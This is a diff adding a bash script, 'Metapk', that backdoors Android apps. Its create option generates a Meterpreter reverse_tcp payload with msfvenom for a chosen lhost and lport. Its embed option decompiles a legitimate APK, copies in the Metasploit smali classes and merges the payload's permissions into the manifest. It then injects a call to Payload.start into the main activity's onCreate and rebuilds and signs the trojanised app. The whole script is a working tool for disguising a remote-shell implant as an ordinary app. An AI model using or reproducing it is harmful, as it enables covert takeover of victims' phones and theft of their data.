@@ -1,0 +1,158 @@
+#!/bin/bash -x
+excode=0
+if ! [ -d "$(pwd)/logs" ]; then
+	mkdir "$(pwd)/logs"
+fi
+logfile="$(pwd)/logs/metapk`date +%s`.log"
+cleanup(){
+	echo "+ Cleaning Up"
+	for i in ./{activity, file}; do
+		[ ! -f $i ] || rm $i
+	done
+	rm -rf original/
+	rm -rf payload/
+	echo "+ Done"
+}
+manifest(){
+	x=$(grep -n -w uses-permission original/AndroidManifest.xml)
+        while [ $(wc -l <<<$x) != 1 ]; do
+        x=$(sed '1d' <<<$x)
+        done
+        x=$(sed 's/:.*//' <<<$x)
+        x=$(($x+1))
+        cat payload/AndroidManifest.xml | grep uses-permission > manifest
+        while read -r i || [[ -n $i ]]; do
+                sed -i ''$x'i'"\    $i"'' original/AndroidManifest.xml
+                x=$((x+1))
+        done < manifest
+        rm manifest
+	embed
+	sign
+	if [ "$?" != "0" ]; then
+		if [ "$(grep -w v0 $logfile)" == "v0" ]; then
+		embed fallback
+		sign
+else excode=1
+	fi
+	if [ "$excode" != "0" ]; then
+		echo "> An Error Occured, See $logfile for details"
+		cleanup
+	fi
+fi
+}
+browse_smali(){
+	for i in "$1"/*;
+        do
+     filename="${i##*/}"
+     base="${filename%.[^.]*}"
+     ext="${filename:${#base} + 1}"
+        if [ -d $i ]; then
+                browse_smali $i
+        fi
+        if [[ -z "$base" && -n "$ext" ]]; then
+        base=".$ext"
+        ext="nil"
+    fi
+        if [ "$ext" == "smali" ]; then
+               smal=$(echo $i | grep -w $x.smali)
+			if [ "$smal" != "" ]; then
+				actvt=$(cat $smal | grep "\->onCreate(Landroid\/os\/Bundle;)V")
+				if [ -z "$actvt" ]; then
+					cat $smal | grep Activity > activity
+					read -r x < activity
+					x=$(sed 's/.*\///' <<< $x | sed 's/;.*//')
+					#if [ "$x" == "HomeActivity\$10"]; then
+					#	break
+					#fi
+					echo $x
+					read enter
+					browse_smali original $x
+					break
+				else
+					echo $smal
+                                	break
+				fi
+			fi
+        fi
+done
+}
+embed(){
+	hook=p0
+	if [ "$1" == "" ]; then
+	echo "+ Embedding Payload Into Original Apk"
+	fi
+	cat original/AndroidManifest.xml | grep \<activity > file
+	read -r x < file
+	x=$(sed 's/.*name="//' <<<$x | sed 's/\".*//' | sed 's/.*\.//')
+#	x=$(tr '.' '/' <<<$x)
+#	r=$(basename $x)
+#	y=${x:0:${#x} - ${#r}}
+	x=$(browse_smali original $x)
+	read -r x <<<$x
+	if [ "$x" != "" ]; then
+	msg="Injecting Hook Into Smali File"
+		if [ "$1" == "fallback" ]; then
+			hook=v0
+			ln=$(grep -n -w metasploit $x | sed 's/:.*//')
+			sed -i ''$ln'd' $x
+			msg="Something Went Wrong, Re-Injecting Hook Into Smali File"
+		fi
+		echo "+ $msg"
+        	 sed -i '/->onCreate(Landroid\/os\/Bundle;)V/a \    invoke-static {'$hook'}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V' $x
+else echo "> Could Not Find Smali File To Inject Hook, See $logfile For Details"
+	exit 1
+        fi
+
+	rm file
+}
+sign(){
+echo "+ Building Original Apk"
+ ./tools/apktool b original/ >> $logfile 2>&1
+
+	if [ "$?" != "0" ]; then
+		excode=1
+		return 1
+	fi
+echo "+ Signing Original Apk"
+jarsigner -verbose -keystore ./tools/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA original/dist/*.apk androiddebugkey >>$logfile
+	if ! [ -d $(pwd)/output ]; then
+		mkdir $(pwd)/output
+	fi
+cp original/dist/*.apk output/
+cleanup
+}
+
+cp_payload(){
+	cp -r payload/smali/com/metasploit original/smali/com
+	manifest
+}
+decompile(){
+	echo "+ Decompiling Original Apk"
+	apktool d -f -o original $1 >> $logfile 2>&1
+	shift
+	echo "+ Decompiling Payload"
+	apktool d -f -o payload $1 >> $logfile 2>&1
+	cp_payload
+}
+create(){
+	msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=$1 lport=$2 -o backdoor.apk
+}
+
+if [ "$1" == "-e" -o "$1" == "--embed" ]; then
+	shift
+	decompile $@
+elif [ "$1" == "--clean" ]; then
+	rm -rf original/ originalbak/ payload/
+elif [ "$1" == "-c" -o "$1" == "create" ]; then
+	shift
+	create $@
+else
+printf "Metapk
+Version: 1.0.0
+Author:Dharmy
+Usage: metapk
+	-c, --create <lhost> <lport>    Creates A Payload With The specified lhost and lport
+	-e, --embed <original apk> <payload>    Decompiles the original apk and payload, embeds the payload, builds the original apk back and signs it
+	--clean    Cleans Up The Working Directory
+"
+fi
